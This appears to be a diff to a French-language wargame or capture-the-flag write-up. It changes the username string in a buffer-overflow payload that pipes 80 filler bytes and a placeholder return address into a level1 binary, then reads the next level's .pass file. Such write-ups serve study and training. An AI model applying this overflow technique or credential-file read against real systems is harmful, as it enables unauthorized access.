@@ -24,5 +24,5 @@ $ /tmp/prog
 pour avoir le meme environnement lors de l'execution).
 
 une fois cette adresse recuperer, on peut creer facilement notre payload:
-(python -c 'print "data_wil\n" + "A"*80 + "\x??\x??\x??\x??"' ; cat) | ./level1
+(python -c 'print "dat_wil\n" + "A"*80 + "\x??\x??\x??\x??"' ; cat) | ./level1
 cat /home/users/level01/.pass
